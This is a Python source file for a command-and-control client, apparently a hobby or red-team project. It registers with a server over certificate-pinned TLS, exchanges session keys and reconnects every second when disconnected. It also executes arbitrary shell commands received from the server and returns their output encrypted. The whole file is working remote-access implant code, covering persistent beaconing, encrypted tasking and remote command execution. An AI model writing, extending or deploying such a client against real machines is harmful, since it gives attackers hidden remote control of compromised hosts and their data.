import asyncio
import logging
import time
import uuid
import base64
import argparse
from typing import List
from models.message import Message
from models.send_receive_msgs import send_message, receive_message
from models.message_type import MessageType
from models.command_type import CommandType
from models.key_manager import KeyManager
from models.encryption_manager import EncryptionManager
from models.tls_helper import TLSSessionHelper
import helper.subprocess as subprocess_helper

# ==================== CONFIGURATION ====================

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(name)s|%(funcName)s:%(lineno)d] %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ==================== CORE C2 CLIENT LOGIC ====================

from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
import base64


def get_spki_hash(der_cert_bytes: bytes) -> str:
    cert = x509.load_der_x509_certificate(der_cert_bytes)
    public_key = cert.public_key()
    spki_bytes = public_key.public_bytes(
        encoding=serialization.Encoding.DER,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    digest = hashes.Hash(hashes.SHA256())
    digest.update(spki_bytes)
    return base64.b64encode(digest.finalize()).decode("ascii")

def validate_server_certificate(writer: asyncio.StreamWriter) -> bool:
    server_sha = "jPxWXE+5YqcWif1pSG7ixZAVbFY3bI1JhbbtaOcPxFM="
    ssl_obj = writer.get_extra_info("ssl_object")
    der_cert = ssl_obj.getpeercert(binary_form=True)
    server_sha_received = get_spki_hash(der_cert)
    if server_sha_received == server_sha:
        return True
    logger.error("Server certificate is not valid")
    return False

class C2Client:
    """Main C2 Client"""
    
    def __init__(self, server_host: str, server_port: int, client_id: str):
        self.server_host = server_host
        self.server_port = server_port
        self.client_id = client_id
        self.key_manager = KeyManager()
        self._encryption_manager = None
        self.reader = None
        self.writer = None
        self.running = True
        self.command_queue = asyncio.Queue()
        self.execution_process = None
    
    async def connect(self) -> bool:
        """
        Connect to C2 server and register
        """
        try:
            if not self.running:
                return False
            ssl_ctx = TLSSessionHelper().create_context(
                is_server=False,
            )
            self.reader, self.writer = await asyncio.open_connection(
                self.server_host,
                self.server_port,
                ssl=ssl_ctx,
            )
            logger.info(f"Connected to server at {self.server_host}:{self.server_port}")
            if not validate_server_certificate(self.writer):
                await self._reset_writer_reader()
                return False
            # Send registration message with client's public key
            if not await self._send_register_message():
                return False
            # Receive acknowledgment with server's public key
            return await self._receive_ack_message()
        
        except ConnectionRefusedError:
            logger.error("Connection refused, server possibly down")
        except asyncio.CancelledError:
            logger.info("Connection attempt cancelled")
        except Exception as e:
            logger.error(f"Connection failed: {e}")

    async def _receive_ack_message(self) -> bool:
        encrypted_message = await receive_message(self.reader)
        if not encrypted_message:
            logger.error("No acknowledgment received")
            return False
        msg = Message.from_payload(encrypted_message)
        if msg and msg.type is MessageType.ACK:
            # Setup encryption with server's public key
            session_key = self.key_manager.compute_session_key(msg.command)
            self._encryption_manager = EncryptionManager(session_key)
            logger.info(f"Registered as {msg.client_id}")
            return True
        logger.error("Registration failed")
        return False
    
    async def reconnect_loop(self):
        """
        Auto-reconnect logic
        Attempts to reconnect every 1 second if disconnected
        """
        try:
            reconnect_delay = 1
        
            while self.running:
                if self.reader and self.writer:
                    logger.info('reader/writer exists - no reconnection needed')
                    return
                
                if await self.connect():
                    logger.info(f"Connected successfully {self.client_id}")
                    return
                
                logger.info(f"Attempting to reconnect in {reconnect_delay}s...")
                await asyncio.sleep(reconnect_delay)
            
        except asyncio.CancelledError:
            logger.info("Reconnect loop cancelled")
            await self._reset_writer_reader()
        except Exception as e:
            logger.error(f"Reconnect loop error: {e}")
            await self._reset_writer_reader()
    
    async def main_loop(self):
        """
        Main client loop
        """
        tasks = [
            asyncio.create_task(self._command_listener()),
            asyncio.create_task(self._command_processor()),
        ]

        try:
            await asyncio.gather(*tasks)
        except asyncio.CancelledError:
            logger.info("Client main loop cancelled")
            self.running = False
        except asyncio.IncompleteReadError:
            logger.info("main loop error - Server closed connection")
        except Exception as e:
            logger.error(f"Client main loop error: {e}")
        finally:
            if self.running:
                await self._reset_writer_reader()
                logger.info("Client main loop finished - client still running")
                return

            logger.info("Client canceling tasks")
            await self._cancel_tasks(tasks)
            logger.info("Terminating execution process")
            await self._terminate_execution_process()
            # Clear connection state
            await self._reset_writer_reader()
            logger.info('Main loop done')

    async def _reset_writer_reader(self):
        try:
            logger.info('in reset_writer_reader')
            if self.writer and not self.writer.is_closing():
                self.writer.close()
                await self.writer.wait_closed()
        except Exception as e:
            logger.error(f"Error closing writer: {e}")
        finally:
            self.reader = None
            self.writer = None

    @staticmethod
    async def _cancel_tasks(tasks: List[asyncio.Task]):
        try:
            for task in tasks:
                if not task.done():
                    task.cancel()
        except Exception as e:
            logger.error(f"Error cancelling tasks: {e}")
    
    async def _command_listener(self):
        """
        Listen for incoming commands from server
        """
        try:
            while self.running:
                encrypted_message = await receive_message(self.reader)
                if not encrypted_message:
                    logger.warning(f"Received an empty message")
                    break
                    
                msg = self._encryption_manager.decrypt(encrypted_message)
                if not msg:
                    logger.warning(f"Failed to decrypt message")
                    break
                
                if msg.type is not MessageType.COMMAND:
                    logger.warning(f"Unknown message type: {msg.type}")
                    continue

                if msg.command == CommandType.KILL.value:  # TODO
                    await self._handle_received_kill_command()
                await self._push_to_queue(msg)  # Queue command for execution
                logger.info(f"Received command: {msg.command}")
            else:
                logger.info("command_listener exiting | client not running")
        
        except asyncio.CancelledError:
            logger.info('command_listener cancelled')
        except asyncio.IncompleteReadError:
            if self.running:
                logger.info("Server closed connection")
                raise
            else:
                logger.info("Client closed connection")
        except Exception as e:
            logger.error(f"Command listener error: {e}")

    async def _handle_received_kill_command(self) -> None:
        await self._terminate_execution_process()
        self._drain_queue()
        self.running = False

    async def _push_to_queue(self, message: Message) -> None:
        await self.command_queue.put({
            "cmd_id": message.cmd_id,
            "command": message.command
        })

    def _drain_queue(self):
        # TODO: make global helper function
        try:
            while not self.command_queue.empty():
                cmd_data = self.command_queue.get_nowait()
                self.command_queue.task_done()
                logger.info(f"Drained command: {cmd_data.get('command', '')}")
            logger.info("Drained command queue")
        except asyncio.QueueEmpty:
            logger.info("Command queue is empty")

    async def _fetch_command_from_queue(self) -> tuple[str, str]:
        """
        Fetch command from queue
        """
        command_data: dict = await self.command_queue.get()
        if command_data is None:
            return None, None
        command_id: str = command_data.get("cmd_id")
        command: str = command_data.get("command", "").lower()
        return command_id, command
    
    async def _command_processor(self):
        """
        Execute commands from queue
        """
        try:
            while self.running:
                cmd_id, command = await self._fetch_command_from_queue()
                if command is None:
                    logger.info("Received None from queue")
                    break
                logger.info(f"Processing command: {command}")
                
                result, exec_time_ms = await self._process_command(command)
                # Send result back to server
                if not await self._send_result(cmd_id, result, exec_time_ms):
                    logger.error("Failed to send result")
                    break
                logger.info(f"Result sent ({exec_time_ms:.1f}ms)")
            else:
                logger.info("command_processor exiting | client not running")
            
        except asyncio.CancelledError:
            logger.info('command_processor cancelled')
        except Exception as e:
            logger.error(f"Command processor error: {e}")

    async def _process_command(self, command: str) -> tuple[str, float]:
        start_time = time.monotonic()
        if command == CommandType.KILL.value:  # TODO
            result = "Client killed by server"
        else:
            result = await self._execute_command(command)  # Run asynchronously with subprocess
        exec_time_ms = (time.monotonic() - start_time) * 1000
        return result, exec_time_ms
    
    async def _send_result(self, command_id: str, result: str, execution_time_ms: str) -> bool:
        msg = Message.as_result(command_id, result, execution_time_ms)
        msg = self._encryption_manager.encrypt(msg)
        return await send_message(
            self.writer,
            msg
        )

    async def _send_register_message(self) -> bool:
        """
        Send registration message to server
        """
        msg = Message.as_register(self.client_id, self.key_manager.serialized_public_key)
        return await send_message(
            self.writer,
            msg.to_payload(True)
        )

    async def _execute_command(self, command: str) -> str:
        """
        Execute bash-style command
        """
        try:
            self.execution_process = await subprocess_helper.create_subprocess(command)
            logger.info(f"Execution process created (pid: {self.execution_process.pid})")
            output = await subprocess_helper.communicate_subprocess(self.execution_process)
            self.execution_process = None
            return output
        except asyncio.CancelledError:
            await self._terminate_execution_process()
            raise            
        except Exception as e:
            logger.info(f"Command execution error: {str(e)}")
            raise

    async def _terminate_execution_process(self):
        """Terminate execution process if it exists"""
        if not self.execution_process:
            return
        try:
            pid = self.execution_process.pid
            await subprocess_helper.terminate_subprocess_gracefully(self.execution_process)
            self.execution_process = None
            logger.info(f"Terminated execution process gracefully (pid: {pid})")
        except asyncio.TimeoutError:
            logger.error("Graceful termination timed out")
        except Exception as e:
            logger.error(f"Error gracefully terminating process: {e}")
        finally:
            if not self.execution_process:
                return
            try:
                await subprocess_helper.terminate_subprocess_forcefully(self.execution_process)
                self.execution_process = None
                logger.info(f"Terminated execution process forcefully (pid: {pid})")
            except Exception as e:
                logger.error(f"Error forcefully terminating process: {e}")

    async def start(self):
        """Start the C2 client"""
        logger.info(f"Starting C2 client (ID: {self.client_id})")
        
        # Start with reconnect loop - it handles both initial connection and reconnections
        try:
            while self.running:
                await self.reconnect_loop()
                if self.reader and self.writer:
                    await self.main_loop()
        except asyncio.CancelledError:
            logger.info("Client start cancelled")
        except Exception as e:
            logger.error(f"Client start error: {e}")
            await asyncio.sleep(1)  # Prevent tight loop on repeated failures

# ==================== MAIN ====================

async def main():
    parser = argparse.ArgumentParser(description="C2 Client")
    parser.add_argument("--server-host", default="127.0.0.1", help="Server host")
    parser.add_argument("--server-port", type=int, default=5000, help="Server port")
    parser.add_argument("--client-id", default=None, help="Client ID (auto-generated if not provided)")

    args = parser.parse_args()

    # Generate client ID if not provided
    client_id = args.client_id or f"client-{uuid.uuid4().hex[:8]}"
    
    client = C2Client(args.server_host, args.server_port, client_id)
    
    try:
        await client.start()
    except KeyboardInterrupt:
        logger.info("Client shutdown")
        client.running = False

if __name__ == "__main__":
    asyncio.run(main())